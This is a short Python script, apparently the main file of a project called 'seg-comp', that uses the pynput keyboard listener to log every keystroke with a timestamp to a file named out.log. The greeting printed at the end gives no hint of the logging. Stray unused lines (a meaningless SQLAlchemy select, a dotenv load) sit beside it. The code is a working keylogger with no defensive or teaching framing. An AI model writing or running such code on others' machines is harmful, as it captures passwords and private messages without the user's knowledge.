import logging

from dotenv import load_dotenv
from pynput.keyboard import Listener
from sqlalchemy import select

load_dotenv()

a = select("asd")

logging.basicConfig(
    filename="out.log", level=logging.DEBUG, format="%(asctime)s - %(message)s"
)


def on_press(key):
    logging.info(str(key))


def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

    print("Hello from seg-comp!")


if __name__ == "__main__":
    main()
